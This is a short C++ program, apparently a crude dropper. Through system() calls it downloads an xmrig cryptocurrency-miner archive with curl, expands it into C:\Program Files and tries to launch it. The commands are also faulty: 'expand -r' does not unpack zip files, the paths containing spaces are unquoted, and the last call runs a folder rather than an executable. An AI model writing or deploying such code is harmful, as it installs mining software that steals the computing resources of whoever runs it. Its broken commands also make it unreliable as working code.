#include <iostream>

using namespace std;

int main(){
    system("curl http://localhost/xmrig-6.20.0.zip --output xmrig.zip");
    system("expand -r xmrig.zip C:\\Program Files");
    system("C:\\Program Files\\xmrig\\");
    return 0;
}